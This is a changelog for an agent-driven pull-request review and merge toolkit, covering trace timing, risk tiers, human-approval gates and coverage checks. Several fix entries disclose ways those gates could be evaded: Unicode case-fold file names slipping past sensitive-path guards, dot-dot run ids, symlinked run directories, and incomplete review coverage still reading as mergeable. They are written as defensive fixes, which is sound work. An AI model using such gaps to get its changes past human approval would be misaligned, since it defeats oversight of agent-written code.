- **packages/development:** `pr-review-cli.js timing`, review timing from a run trace instead of omp session files (kata `gkt9`, plan sections 1 and 5). `lib/pr-review-timing.js` names the review stage spans (`review`, `review.head-read`, `review.gate`, `review.classifier`, `review.second-assessor`, `review.security-lane`, `review.reviewer`, `review.verifier`, `review.verdict`, recorded with `toolchain-cli trace`) and reads `trace-<runId>.jsonl` back into the orchestrator window, orchestrator-only time (wall minus the union of the intervals in which a dispatched agent was active or a verdict was being computed), the critical path (slowest reviewer, then slowest verifier, then verdict, per round, each step cut to the window) and a per-stage table, so the out-of-repo `~/.omp/review-speedup/overhead.js` is no longer needed. An agent interval ends at its last `message` (the span attr `last_message_ts` when a recorder could only close the span at `session_exit`), never at the idle linger, and the linger it leaves out is reported (`agents.lingerMs`). A span is as long as the recorder's `duration_ms`, so a system sleep or wall-clock step is not counted; a span the recorder flagged `clock_anomaly` is unusable, and when the wall clock stepped inside the window the figures that need positions (agents active, orchestrator-only, before first dispatch, the critical path) are missing with that reason. The verdict is counted once (in the critical path, so orchestrator-only time leaves it out and the two never add up to more than the window). The critical path needs a usable window, a step cut to it says so (`clippedMs`), and steps that overlap or run out of order, or a round with two verdict spans, are never summed. A figure that was not recorded is `{ms: null, missing: true, reason}`, never zero, and an unfinished agent makes orchestrator-only time an upper bound. A recorded #234 review, converted to a trace, reproduces the plan's figures (92 turns, 19.7 min, 70% orchestrator-only). Also runnable as `node lib/pr-review-timing.js <runId> [--cwd <dir>] [--json]`. Nothing records these spans yet: the `review-run` runner (a later child of epic `ptqb`) is the intended recorder, and until it lands a trace has to be written by hand with `toolchain-cli trace`.
- **packages/git:** `/ensemble-pr-merge` now records a per-run span trace. The new `pr-merge-trace` skill (`packages/development/skills/pr-merge-trace/SKILL.md`) holds the recipe, and the command only points at it: the run id is generated first, then spans (via the `toolchain-cli trace start|end|summarize` verbs) wrap preflight, PR discovery, each round (manifest with local-ci-gate cache hit/miss and head SHA, host review reads, remediation with one `subagent` span per dispatched subagent plus the barrier wait, verify-recheck), the review gate, both sweeps, confirm-status, merge, branch delete and the PR comment, and every human prompt sits in a `human-wait` span. The final JSON report gains `trace_summary` (path, per-phase totals, unaccounted time, human-wait vs machine time) or `{"trace":"unavailable","reason":...}`; all existing keys are unchanged. Tracing is observational only and never alters a merge decision.

- **packages/development:** review quality guard (`lib/review-eval-guard.js`, kata `cwd4`). Runs a review pipeline's findings through the eval library (`validateCase`, `scoreEval`, `staleCases`, `compareEval`) over the eval set in `docs/review-eval/cases` (nine Important findings from #228, #233 and #234, each pinned to a commit) and exits 1 when an expected Important finding is missing at its location, a case is unconfirmed or unloadable, a case's pinned commit is absent, lacks the file or has fewer lines than the recorded range ends at (the recorded lines themselves are not read), or the run regresses against the previous entry of `docs/review-eval/history.jsonl`. The cases, CODEOWNERS, rules files and that history are read from the required `--base` commit, never from the checkout under test. A case is matched by location and severity, not by what a finding says. Stale cases (rules file changed) are an advisory unless `--fail-on-stale`; a pin the checkout cannot verify fails unless `--allow-unverifiable-pins`. With `--history`, each run that reaches scoring appends its false-negative rate. Documented in the `pr-review-eval` skill (Step R3a) and `docs/review-eval/README.md`; the case set and baseline are reconstructed from the PR records (only V-1's severity was recorded by the review; the #233 and #234 severities are inferred), see its provenance section. The pi bundler now vendors the guard. The `pr-review-eval-scenarios` test that pinned "the repository ships no eval cases" now asserts every shipped case is owner-confirmed instead.
- **packages/development:** `pr-review-prepare` (`lib/pr-review-prepare.js`, entry `lib/pr-review-prepare-cli.js`, guide `docs/guides/pr-review-prepare.md`). One deterministic preparation step per reviewed head, under `.ensemble/pr-review/prepare/<runId>/<head>/<fingerprint>/`: a `git archive` snapshot of the head tree (checked against `git ls-tree`, made read-only before any head code runs and checked again after it), `range.diff` (`BASE...HEAD`), `delta.diff` (only when `review-range` says delta, otherwise absent with the reason), `facts.json` (base-commit policy, `paths` classification, tier inputs, `changedPaths` as the union of `git diff --numstat -z --no-renames` over `BASE HEAD`, the form the skill pins, and `BASE...HEAD`, so no path the PR changes is dropped), a ready probe runner (`probe.js`, which refuses a path that leaves the snapshot, through a committed symlink too) and a baseline run of the relevant test files, each with a sha256. The baseline executes the head's test code: in a scratch directory in the OS temp directory (outside the repository, the state root and the staging directory), with a scratch `HOME`, the environment allowlist of `local-ci-runner.js`, a git ceiling and a private copy of `node_modules` (absolute symlinks left out and listed as `skippedLinks`; about 7 s for this repository's tree), its process group killed when it ends and inherited credential values scrubbed from `baseline.log`; facts, probe and diffs are written only after it, the snapshot is verified again, and a run that wrote into the staging directory fails the step. It is not a sandbox (the guide lists what remains exposed). The step fails closed (unreadable base or head, a head that moved mid-run, a snapshot that is not exactly the head tree, a symlinked `REVIEW.md` or `CODEOWNERS` at the base, a baseline that cannot start) and publishes nothing; re-running with the same inputs returns the published directory only after deriving what git can tell again and finding the directory holding exactly that (the baseline's own output is the one thing taken as recorded), and any other input (range decision, test files or command, timeout, `nodeModules`) gets a directory of its own instead of replacing one a reader holds. Vendored into `packages/pi` (new `ENTRY_FILES` entry in `lib-bundler.ts`) and `packages/full/lib`.

- **packages/development:** `pr-review-cli.js results`, review results by file with harness deadlines and agent-failure classification (kata `et2k`, plan section 3C). `results deadlines` computes the `dispatchedAt` and `deadlineAt` for an agent (reviewer 15 min, verifier 5, security lane 15), `results collect` reads each expected agent's `out-<name>.json` and classifies it `arrived`, `missing`, `expired` or `invalid`, accepts a yield that is a JSON string holding the object, quarantines truncated, unparseable or wrong-schema files with a reason, copies every arrival to a scratch directory so a restarted orchestrator reaches the same answer, and turns an agent that did not arrive into `incompleteVerifiers` (the candidate stays `unverified`) or an unreviewed slice (its paths are reported uncovered). A file counts as arrived only when its inode change time, which a writer cannot set backwards, lies between `dispatchedAt` and `deadlineAt`: an older file is stale (another round's, a placeholder) and a later one is expired. A reviewer given a `sliceId` must list its `paths`. Result files are read without following symlinks, and the scratch directory (default: the hidden sibling `.<dir name>.collected`, never inside `dir`) must be private or it is not used. `results failure` decides retry, backoff, alternate model route or fail-fast to a recorded `partial` state, and given the agent's `deadlineAt` it fails fast instead of waiting past it; a retry-after of hours is classified as a fail-fast, but no skill or command calls `results` yet, so no review behaves differently until the runner consumes it. New review policy keys `deadlineMinutes` (per role, 1-60) and `maxConcurrentAgents` (1-32, default 8; validated only, nothing reads or enforces it yet). Limit: this code computes deadlines and classifies; it does not stop an agent. Killing one at its `deadlineAt`, and holding the number of running agents to `maxConcurrentAgents`, is the dispatcher's job. The vendored Pi copies `packages/pi/vendor/lib/pr-review-{cli,policy,results}.js` carry the same change.
- **packages/development:** `pr-review-cli.js verify-assign` plans verification per candidate (plan 3A, kata f1w6): exactly K distinct verifiers (3 Standard, 5 Deep) for each candidate, never anyone who raised it (its `reviewer`, its ledger `source` and each `mergedFrom[].source`; a candidate naming no raiser is refused), spread evenly so each verifier agent takes one or a few candidates; a pool smaller than K is an explicit `verifier-pool-too-small` error, or with `allowShortPool: true` the short candidate is planned with what it can have and flagged `incomplete`. `votes` accepts the plan as `assignment` and validates against it (a plan that does not give each finding exactly K distinct verifiers, bar an `incomplete` entry, blocks the round, a vote from an unassigned verifier is ignored as `not-assigned`, an assigned verifier with no counted vote is named in `incompleteVerifiers` so the finding is `unverified`); `votes` now also ignores a vote from any raiser of the finding (`source`, merged sources), not only its `reviewer`. `depth` now grades `verifiers` as distinct verifiers per candidate and accepts the assignment list, and a plan for zero candidates (`candidates: 0`, which `verify-assign` returns) passes the verifier floor while a refused plan's empty list does not. `verify-assign` joins `votes` in the `verified-findings` reachability capability.
- **packages/development:** review-run mode selection. `lib/pr-review-mode.js` (`selectMode`), reached as `pr-review-cli.js mode` over `{ tierResult }` (the `tier` subcommand's output), answers `light` for Low and Medium and `full` for High, a sensitive or High path, a tier someone raised (a second assessor included) and anything it cannot read: a missing, partial or garbage record, an unknown tier or effective tier, or a tier that contradicts its effective tier. The mode comes from the tier only, never from the size of the diff or an agent's judgement; light still requires the security lane where the gate does (Medium included). Registered as a `mode` capability in the reachability registry and invoked from the `pr-review-cycle` Step 1c reference.
- **packages/development:** `tests/pr-review-paths-property.test.js`, a seeded property harness for the approval-gate glob/path matcher: 60,000 generated (pattern, path) pairs per run compared with an independent oracle (own glob matcher, explicit fold tables, no regex built from a pattern). It generates Unicode case-fold aliases (Kelvin, long s, sharp s, ligatures, Ohm, Angstrom, Greek sigma), dotted and dotless i, regex metacharacters, newline, tab, space, NUL and line-separator names, astral names, whitespace at a pattern's edge and a family of `?` and `*` patterns set against characters whose fold is several letters; and it grades `classifyPaths` (default floor, declaration files, declared sensitive and High patterns, CODEOWNERS owners) over names that travel through the real `git diff --numstat -z --no-renames` parser (`parseNumstatZ`). Its header lists what it does not cover (Unicode normalization, other file systems' folds, bracket classes) and says the oracle is written from the same rules as the matcher, so agreement shows the code follows them, not that they are right. Deterministic for a fixed seed; `PR_REVIEW_FUZZ_SEED` (decimal or `0x` hex; anything else is an error) and `PR_REVIEW_FUZZ_CASES` replay or widen a run, and a failure prints its seed. `tests/pr-review-gate-chain.test.js` adds before/after chains through the approval gate and the real `pr-review-cli.js` entry point. The reviewer brief template (`pr-review-cycle/templates/reviewer-brief.md`) tells reviewers to read the header of the property test and the chains before spending calls on matcher edge cases or gate sequences, to treat what those already check as checked, and to report what they do not cover.

- **packages/development:** `soloMaintainer` review policy key (off by default; on in this repo's `REVIEW.md`). With exactly one `maintainerLogins` entry, a High PR that touches no sensitive path or declaration, was not raised to High by a second assessment or proposal, and was directed by that maintainer needs one human instead of two, provided the PR's author is known and, unless that maintainer is also the author, they have approved the current head on the host. A maintainer who is the author (every agent PR committed under their own login, where the host refuses a self-approval so none can exist) is credited as the author-as-director on their own word: the discount applies, and the approvals result carries the non-blocking warning `solo-maintainer-self-credit` so the gate result and report show it rested on self-credit. A `Directed by:` line is text the PR's author writes, so for any other author it on its own never lowers the requirement, and a PR whose author cannot be read keeps two humans. `effectiveTier` decides eligibility, `evaluateApprovals` authenticates the director (naming the failed fact in `warnings` when it refuses) and `evaluateGate` accepts the lower floor only when the tier record it is given and the approvals name the same person; the security lane still blocks High, and every other High PR keeps two humans. The discount also needs inputs it can trust. `changedPaths` is now defined as `git diff --name-only -z --no-renames <base> <head>` split on NUL, so a move lists both sides and no name is quoted, and a list that is missing, empty or holds a name that is not verbatim (git quoted it, or it holds a control character or a line or paragraph separator, which `-z` prints raw) refuses the discount. A glob's `**` now matches every character, line terminators included, so a name holding U+2028 or U+2029 no longer slips past `.github/workflows/**`, and Step 1c's slices `paths` come from `git diff --numstat -z --no-renames <base> <head>` too, so the coverage check matches `changedPaths` name for name. A second assessment that did not say no, a proposal of High, or no second assessment at all (omitted or null, recorded as `second-assessment-missing`) keeps a PR at two humans even when the tier was already High; a missing assessment raises nothing. `REVIEW.md` also declares the review guards sensitive, so a change to them keeps two humans: the review and local-CI gate code under any file name or extension (Node loads an extensionless sibling before `.js`) and every copy of it, the vendored ones and the full bundle's links included, the local-CI approval set and its runner script, the whole `pr-review-cycle` skill, and the `pr-merge` command source with its generated copies. A pattern that names a path is matched ignoring letter case, because a case-insensitive checkout writes `PR-REVIEW-GATE.JS` over `pr-review-gate.js`. Also fixes this repo's own `REVIEW.md` policy block, which was inert: it declared a `sourceSha`, a commit cannot name itself, so the loader always answered `policy-not-from-base` and every review ran on the strict defaults. The block no longer declares one, so `maintainerLogins`, `botLogins`, `sensitivePaths` and `highPaths` are now in force on every review.

- **packages/pi-extension:** model role check. When an Ensemble agent asks for the OMP tier role `high` or `medium` and `modelRoles` does not set it, the extension now says so loudly instead of OMP staying quiet. It handles OMP's `before_subagent_spawn` event, which carries the model list after `task.agentModelOverrides` and role expansion, so it never fires for a configured role or a pinned agent. A fallback that still resolves gets a once-per-session warning; when nothing resolves the spawn is refused with a message naming the missing `modelRoles.<role>` keys, `~/.omp/agent/config.yml` and an example, instead of OMP's "No model selected" and its advice to `/login`. Measured on omp 18.16.0; Pi and older OMP never emit the event and keep OMP's quiet fallback. The extension registers one handler in every session, and stays at 0.1.2: it has no marketplace entry and is installed from a checkout.

### Fixed

- **packages/development:** two small fixes to the review-speedup pipeline (kata `755m`, `yz76`, epic `ptqb`). `pr-review-cli walltime row` no longer counts `review.gate` spans as `gate_runs`: those are the runner's merge-gate evaluations (two for the measured runs), the baseline's `gate_runs` are local-CI gate runs, and `compare` set the two side by side. A review trace records no local-CI gate starts, so the row now states `gate_runs: null` with that reason (compare shows no figure rather than a figure of another meaning) and carries the span count as `review_gate_spans`, which the trace check re-derives; the committed baseline is untouched. `review-run-cli collect` validated nothing before `peekRun` read `run.json`: a `runId` with dot-dot segments or an absolute path read a file outside the run directory. `peekRun` now reads only for a `runId` of the shared safe shape (`isValidRunId`) and an absolute `repoRoot`; anything else is `{}` and `collect` answers `invalid-input`. Review round 1 of the PR: the run area (`<repoRoot>/.ensemble/pr-review/run`) now refuses a symlink on every read, directory and write of a run (the loader, `saveRun`, `prepare`'s run-exists read, the result collector, the peek), through one helper: before, `collect` loaded a run through a symlinked run directory and rewrote the target. `walltime compare` leaves a current row's `gate_runs` out of the gate-run comparison unless its trace confirms it (rows written by the earlier `walltime row` fail that check and must be regenerated), says `current-no-figure` instead of `too-few-prs: 0`, reports a total of `null` for no figures, and warns `trace-check-failed` for every failed check whatever the claim.
- **packages/development: an incomplete review coverage now stops the merge gate and the local phase instead of being reported beside a mergeable verdict (kata `k48x`, epic `ptqb`).** Before, a slice whose reviewer expired, a whole-range reader that expired or listed too few paths, or a changed path no reviewer read was written into the answer (`notReviewed`, `reducedReview`, `coverage.complete: false`) while the gate, whose input never held it, answered `mergeable: true` and the status could still be `LOCAL_REVIEW_COMPLETE`. A new pure `lib/pr-review-coverage.js` (vendored) holds the record every consumer reads: `{ status: 'complete' | 'incomplete' | 'unavailable', gaps }`, one finding-shaped gap per unread slice (`coverage:slice:<id>`), per lost whole-range reader (`coverage:whole-range`), per path no slice held (`coverage:uncovered`) and per path read under too few lenses (`coverage:under-reviewed`). `evaluateGate` takes it as a REQUIRED `coverage` input (absent, unreadable or `unavailable` is `review-data-unavailable`, never complete) and answers one `review-coverage-incomplete` blocker per open gap, naming the slice, its paths and why its reviewers did not arrive; `deriveStatus` takes a required `coverage` fact and answers `LOCAL_REVIEW_PENDING` with `next: complete-review-coverage` (`LOCAL_REVIEW_BLOCKED` when it is missing or unavailable). A record is read only in its contract shape, `{ status, gaps, reason? }`: a bare `{ status: 'complete' }`, a record with no `gaps` array, or one carrying a key outside the contract (a `complete` flag, an `unreviewedSlices` list copied from another answer) is refused as unavailable data. `slices` with `reviewedBy` answers the record `unavailable` when `changedPaths` is not given or when the plan holds a path it does not name (the two lists were not cut from one listing), and its `ok` and `covered` follow the record, so it never says `covered: true` beside a record that is not complete. The operator's way out is the existing one and nothing new: run the review again on this head, or `ledger resolve` the gap (the decision list shows it in its own `Not reviewed` group with Accept as its only choice and a reason of its own; the note says what happened to the gap: a slice one of its reviewers did read is not called unread, and a whole-range or under-reviewed gap does not say nobody read it), graded by the same provenance rule as a finding's decision (a reason, a login, a time and this head; `cleared`, a deferral and a decision for another head close nothing) and reported as `coverage-gap-accepted`. `review-run` builds the record from the stored run and feeds the gate, the status and the decision list from it (a light, a full and a Quick run follow the same rule; a replay of a finished run answers the same; it also fixes `coverageFailure` returning empty arrays that were truthy under `||`); `carry` `action: 'coverage'` carries every gap of the earlier report through a delta round (their old decisions are stale at the new head) and none through a full range. The security lane keeps its own mechanism, and a reader the plan never made (`reader-not-planned`) stays a reported limit, not a gap. **One operator action:** `coverage` is now a required input, so a state report written before this release has none and `status` and `gate` read it as `review-data-unavailable` / `LOCAL_REVIEW_BLOCKED` until a FULL-range round of that PR writes it: `carry` `action: 'coverage'` answers a delta round over such a report `unavailable` with `fullRangeRequired: true` (so does every delta round after it), so re-run the round once over the full range (`deltaPlan.mode: 'full'`) and the later delta rounds carry its record; a caller outside this repository must pass `coverage` too. **Limits, stated:** the beads recorder reads a `coverage` input and records one bead per open gap (never closing it), but the runner never calls the recorder, so a light-mode run's coverage gaps get no bead; the operator's decision list still shows each one. An empty diff (no changed path) has no coverage to grade and is refused as unavailable data; whether it should read as complete instead is an owner decision. A gap decision is graded by the same provenance rule as a finding's (it cannot prove a person typed it); whether to harden both is an owner item.
- **packages/development: the PR-review beads recorder binds its checkout to the pull request's repository (kata `97ra`, epic `ptqb`).** `pr-review-beads-cli.js` took `repoRoot` on trust: a `repoRoot` that was another repository (a fork checkout, or any unrelated repository) received the beads of a pull request that is not its own. Its trust checks (`checkTrust`) now start by finding the primary checkout and requiring that its `origin`, every fetch and push URL, names `repo` (case-insensitive; https, ssh and scp-like forms), before the host or the tracker is asked: another repository is `REFUSED` `repository-mismatch`; no `origin`, a URL that names no `owner/name` or a git that cannot list the remotes is `repository-unknown`; a repository with no primary checkout is `no-primary-worktree` (a linked worktree's own remote configuration is never consulted, and a fork checkout whose `upstream` names the repository is still refused). The binding (`bindRepository` in `pr-review-repo.js`) is the one the merge sweep made in `local-ci-sweep-record.js`, which now gets it from `checkTrust` instead of carrying its own copy; its behaviour is unchanged. The recorder's test repositories now have an `origin`.
- **Root jest config keeps `.ensemble/` runtime state out of the test crawl (kata `xteg`).** `pr-review-prepare` writes a read-only copy of every prepared head under `<repoRoot>/.ensemble/pr-review/prepare/<run>/<head>/<fingerprint>/snapshot/`, and jest's default crawl descended into it: in the same checkout `npx jest scripts/tests/toolchain-runtime-parity.test.js` ran 4 copies (11 tests became 44, 33 failing: a snapshot has no `node_modules`) and the haste map reported each snapshot's `package.json` as a naming collision. A new root `jest.config.js` sets `modulePathIgnorePatterns: ['<rootDir>/\\.ensemble/']`, anchored on the root so a jest run rooted inside a snapshot (its own path contains `/.ensemble/`) still finds its tests. The workspace packages keep their own configs. Covered by `scripts/tests/jest-config-ensemble-state.test.js`.

- **`pr-review-paths.js` glob matcher: three defects found by the new fuzz harness (`packages/development`).** (1) A path-naming sensitive or High pattern ignored letter case with the `iu` regex flag, which folds one letter to one letter; a case-insensitive file system (APFS verified) also folds `U+00DF`/`U+1E9E` to `ss` and `U+FB00`..`U+FB06` to `ff`, `fi`, `fl`, `ffi`, `ffl`, `st`, so `.github/work\uFB02ows/ci.yml` named the guarded workflow yet was graded not sensitive. Both sides are now full-case-folded (`foldCase`) and compared exactly; U+0131 stays unfolded, as APFS leaves it. The name is also still read the old way (as written, with the regex flag's one-to-one fold) and either reading selects it, so the full fold only adds matches: a `?` still takes one character whose fold is several letters (`a/?/b` selects `a/ß/b`, as before) and `a/??/b` selects it too. (2) A `**/` segment matched any text instead of whole directories, so `**/foo` selected `barfoo` and `a/**/b` selected `a/xb`; it now means zero or more whole directories (a declared pattern that relied on the overmatch, such as `**/foo` selecting `xfoo`, stops selecting it). (3) A name that is only whitespace under a guarded directory (`.circleci/\r`) was trimmed to the directory itself and graded not sensitive, and `classifyPaths` handed the matchers an already-trimmed name; every matcher now tries the name as git printed it and with its whitespace dropped, and `classifyPaths` gives the declared sensitive, declared High and CODEOWNERS checks the name as git printed it. Exact-case patterns (bare file names, CODEOWNERS rules) now compile under the `u` flag, as case-loosened ones already did, so `?` takes one code point there: an astral name is one character, `?` selects it and `??` no longer does (before, `?` took half of it and `??` took it). The vendored Pi copy `packages/pi/vendor/lib/pr-review-paths.js` carries the same change.

- **`trd-parser.js` resolves a PRD recorded as a document id (`packages/development`).** A TRD that puts the source PRD's document id (`PRD-2026-<uuid>`) in frontmatter `prd_reference` and the real path in a sibling `prd_path` parsed `prdReference: null`: `extractPrdReference()` accepted only path-shaped values (`looksLikePath()` requires `/` or a `.md` suffix), so `completion-verification` Step 3 and `trd-cli verify` skipped the PRD cross-check silently, with no error. The parser now falls back to `prd_path` (last-resort priority 5; body references and a path-shaped `prd_reference` still win, so an in-document path stays authoritative). The vendored Pi copy `packages/pi/vendor/lib/trd-parser.js` carries the same change.

- **`extractReqPriorities()` reads an inline MoSCoW heading tag (`packages/development`).** A PRD that tags requirements in the heading (`### REQ-NNN: Title (Must)`, `[Should]`, optionally followed by a `[RISK: ...]` suffix) resolved every REQ to priority `null`, which `completion-verification` Step 3 treats as informational-only, so the Must/Should coverage gate never fired and the skill reported 0 gaps on a PRD it had not checked. The parser now reads the heading tag, falls back to the `**Priority:**` line when the heading has none, and canonicalizes the case of both. Step 3 also gets a coverage sanity check: when the extractor returns no REQ, or every REQ has a `null` priority, it records the new gap class `REQ-PRIORITY-UNPARSED`, which makes the verdict `INCOMPLETE` instead of a silent pass. The vendored Pi parser and the generated Pi skill carry the same change.

## [8.1.0] - 2026-10-30

### Changed

- **License: MIT is replaced by Apache License 2.0.** The repository `LICENSE` is now the Apache License, Version 2.0, a `NOTICE` file names the copyright holder (Sunstone Partners), the `license` field of the root manifest, every package's `package.json` and `.claude-plugin/plugin.json` (and the matching `package-lock.json` workspace entries) is `Apache-2.0`, and the README, CONTRIBUTING and package READMEs say so. Releases already published, up to 8.0.0, remain available under the MIT License they were released under. This is the only content change in this release; the packages whose content changed take a patch bump (see Release plumbing).

### Release plumbing

- Aggregate release bumped so existing full-plugin installations receive the
  changed content: `ensemble-full` 8.0.0 → 8.1.0. This is a MINOR release: the
  only change since 8.0.0 is the relicense (see Changed); no package, command,
  agent or skill is added or removed.
- Every package that
  `node scripts/validate-release-bump.js origin/main` lists as content-changed
  takes a PATCH bump, because only its manifest `license` field and its README
  license text changed:
  `ensemble-ai` 7.0.0 → 7.0.1, `ensemble-blazor` 7.0.0 → 7.0.1,
  `ensemble-codex` 6.0.1 → 6.0.2, `ensemble-core` 6.1.0 → 6.1.1,
  `ensemble-development` 7.0.1 → 7.0.2, `ensemble-dotnet` 2.0.0 → 2.0.1,
  `ensemble-e2e-testing` 6.1.0 → 6.1.1, `ensemble-exunit` 5.1.1 → 5.1.2,
  `ensemble-git` 6.1.0 → 6.1.1, `ensemble-infrastructure` 6.1.0 → 6.1.1,
  `ensemble-jest` 5.1.2 → 5.1.3, `ensemble-nestjs` 6.0.0 → 6.0.1,
  `ensemble-opencode` 5.4.0 → 5.4.1, `ensemble-permitter` 5.2.2 → 5.2.3,
  `ensemble-phoenix` 6.0.0 → 6.0.1, `ensemble-pi` 1.6.18 → 1.6.19,
  `ensemble-product` 7.0.0 → 7.0.1, `ensemble-pytest` 5.2.0 → 5.2.1,
  `ensemble-quality` 6.0.1 → 6.0.2, `ensemble-rails` 6.0.0 → 6.0.1,
  `ensemble-react` 7.0.0 → 7.0.1, `ensemble-rspec` 5.2.0 → 5.2.1 and
  `ensemble-xunit` 5.2.0 → 5.2.1. No `@sunstone-partners/ensemble-*`
  dependency or peer range moved; every one is still satisfied.
- `ensemble-pi` is bumped by hand this time: `scripts/bump-pi-version-if-changed.js`
  watches only `packages/pi/{prompts,agents,skills,AGENTS.md}`, which did not
  change, so `generate:pi` wrote nothing while the release gate flagged the
  changed `packages/pi/README.md`.
- `ensemble-opencode`'s `ENSEMBLE_META.version` (returned by the
  `ensemble-info` tool) is 5.4.1 to match its manifest.
- Unchanged: `ensemble-assessment` 2.0.0, `ensemble-guards` 5.2.1,
  `ensemble-telemetry` 5.2.1, `ensemble-lifecycle` 7.0.0 and
  `ensemble-reqnroll` 1.0.2 (their only change is the manifest `license`
  field, which the release gate does not count as content), plus
  `ensemble-agent-core` and `ensemble-pi-extension` 0.1.2 (no marketplace
  entry; installed from a checkout).

## [8.0.0] - 2026-10-30

### Added

- **`flake-reproduction` skill (`ensemble-quality`):** an editable recipe and replayable red-run record for intermittent test failures (PRD-2026-bd69b524, REQ-034 and REQ-035). No automatic retry, quarantine, skip, wider timeout or weaker assertion. `deep-debugger` now loads it for flaky failures. Edit the defaults in the skill's `SKILL.md`; no rebuild is needed.
- **`pr-review-request` skill (`ensemble-development`):** say "review open PRs", "review PR #N" or "review local changes" and the request is routed to `pr-review-cycle` with the right inputs, instead of only being reachable through `/ensemble:pr-merge`, `fix-issue` or `implement-trd-beads`. A PR review reads and reviews only: nothing is pushed, commented or approved on the PR (it is review-only, below). Local changes are the user's own work, so the cycle's batch fix is applied to the working tree and nothing is committed.
- **Review-only PR reviews, with CI as the tests (`ensemble-development`):** a review of someone else's PR (the `pr-review-request` router, or any caller passing `REVIEW_ONLY`) now runs the independent review, verification and report and stops: no batch fix, no post-fix verification, no re-review. Its status is `REVIEW_PENDING` with a reason, never `REVIEW_COMPLETE`, and its local phase is never `LOCAL_REVIEW_COMPLETE`; `pr-review-cli.js status` enforces this through the new `reviewOnly` fact, so no other fact can complete it. A green CI result for the exact head now stands in for the local test run: the router reads the commit's check runs read-only and the CLI derives the tests fact from them (`tests: { source: 'ci', checkRuns, totalCount }`, new `lib/pr-review-ci-tests.js`). Only a check run for that commit that concluded `success` counts; a run for another commit is ignored, and a failed, unfinished or unreadable run, an empty list or a list shorter than the host's own total leaves the tests unshown, so they run locally once. A typed "CI passed" is refused. Local changes are unaffected: not review-only, and the tests still run locally.
- **packages/development, packages/git:** risk tiers, commit-bound human
  approvals and the merge gate (TRD-2026-70e784f2, PR 4).
  `lib/pr-review-tier.js` derives the tier from the change itself (never from
  who wrote it), floors it on sensitive and High paths, and is **raise-only**:
  anyone may propose a higher tier, but a proposal that lowers one is ignored
  and recorded as `lowering-needs-code-owner` unless a code owner of the
  affected path makes it. `lib/pr-review-approvals.js` counts an approval only
  when it is bound to the commit (or tree) under review, so a push invalidates
  it; bot approvals never count, the author never fills a required slot, and
  the person named on an agent-authored PR's `Directed by:` line counts as one
  of the required reviewers. `lib/pr-review-gate.js` answers "may this PR
  merge?" with `mergeable` plus a blocker list that always carries a
  `nextAction`, refusing on an open Important finding, an unanswered security
  finding, an incomplete description or review data it could not read — it
  never passes on missing data. Reached as the `tier`, `approvals` and `gate`
  subcommands of `lib/pr-review-cli.js`, and through `MODE=gate` of the
  `pr-review-cycle` skill, which `pr-merge` now requires `mergeable:true` from
  on freshly read GitHub state.
  **Strict by default:** the Low tier is treated as Medium unless
  `lowWaiverEnabled` is turned on with its evidence, so no PR silently drops
  to zero human reviewers.
  **Honest limit:** these gates run where ensemble runs. Server-side
  enforcement of required approvals needs a branch-protection rule in the host
  repository; `pr-merge` reports when it is absent and recommends it, but
  cannot enforce it. See the README section "Risk tiers, human approvals and
  the merge gate".

- **packages/development:** review metrics and the reviewer eval set
  (TRD-2026-70e784f2, PR 5). `lib/pr-review-metrics.js` computes per-cohort
  human approvals per PR (median and p95), human comments, wait-on-human
  hours, rounds-to-pass, the share of PRs needing five or more rounds and the
  noise rate, counting no bot reviewer, and compares a post-change cohort with
  the committed baseline: targets are graded relative to baseline and a
  revert/incident guardrail fails the cohort on its own.
  `lib/pr-review-eval.js` scores an incident-driven, code-owner-confirmed eval
  case set, compares runs and reports regressions and stale cases. Both are
  reached as JSON-in/JSON-out subcommands of `lib/pr-review-cli.js`
  (`metrics`, `metrics-compare`, `eval-score`, `eval-compare`, `eval-stale`)
  and through the new `pr-review-eval` skill, which walks a maintainer through
  adding a case (`docs/review-eval/cases/<id>.json`) and running the eval set
  when the reviewer's rules, prompts or model change. No dashboard, no
  scheduler, no new dependency: recurrence is the host repository's
  responsibility (Constitution Rule 4).
  **Entry criterion:** a comparison is only meaningful against a baseline
  captured *before* the review changes land — capture the baseline cohort once
  (at least 20 PRs **and** at least 30 days) and commit it as
  `docs/guides/review-baseline-<date>.json`; never edit a baseline in place. A
  cohort missing either floor is returned as `insufficient` with no target
  graded. Runbook: `docs/guides/pr-review-metrics.md` (extends §6 of
  `docs/guides/pr-review-cycle-time-pilot.md`).
  `ensemble-full` mirrors the new libraries and the new skill, and
  `ensemble-pi` vendors them with the generated `pr-review-eval` skill copy.

- **packages/development, packages/core, packages/git:** on-demand sweeps,
  explainers and the cross-runtime reachability proof that completes the code
  review process (TRD-2026-70e784f2, PR 6). `pr-review-sweep` reviews code
  that is **already merged**, sensitive areas first, with the same bounds and
  the same strict-majority verification a PR gets; every finding is tagged
  `Pre-existing`, so a sweep can never block somebody else's merge, and it
  reports without editing, committing, pushing or opening a PR. Recurrence
  stays the host repository's (Constitution Rule 4): the skill holds no timer
  and ensemble's own workflows gain no `schedule:` trigger.
  `pr-review-explainer` describes a module from the code as it is now and
  names every file it read; a High-tier PR's report offers one for each
  touched sensitive module, and generates it only on request.
  `lib/pr-review-reachability.js` proves every capability is reached from the
  REAL entry points -- entry command text to skill to a registered subcommand
  -- rather than merely unit-tested, and grades the four runtimes against a
  baseline.
  **Runtime coverage, stated rather than implied:** Claude Code and Pi are
  equivalent (the same payloads produce byte-identical output from each
  runtime's own shipped CLI); **Codex and OpenCode are reduced** -- both
  generate the command entry points, but neither bundles the `pr-review-*`
  procedure skills or a vendored CLI, so the graded steps do not run there.
  See `docs/reports/pr-review-cross-runtime-reachability.md`.
  The in-agent review needs **no new CI secret** and makes no network call.
  The whole process is now documented for users in section 11 of
  `docs/guides/user-guide.md`.
- **Tool abstraction layer (PRD/TRD 2026-8d825f54):** commands, agents and skills call versioned category capabilities (for example `tracker.show`, `host.change-request-create`, `workflow.push`) instead of naming tool binaries; adapters (`adapter-*` skills with an `adapter.yaml` manifest) implement them for each of the 14 categories. Resolution, preflight, allowlisted no-shell execution and `toolchain-cli validate` live in `packages/development/lib/toolchain/`. `scripts/lint-provider-refs.js` fails CI on a hardcoded tool binary in a shared source, with a baseline ratchet for grandfathered violations and zero tolerance for the named refactored sources.
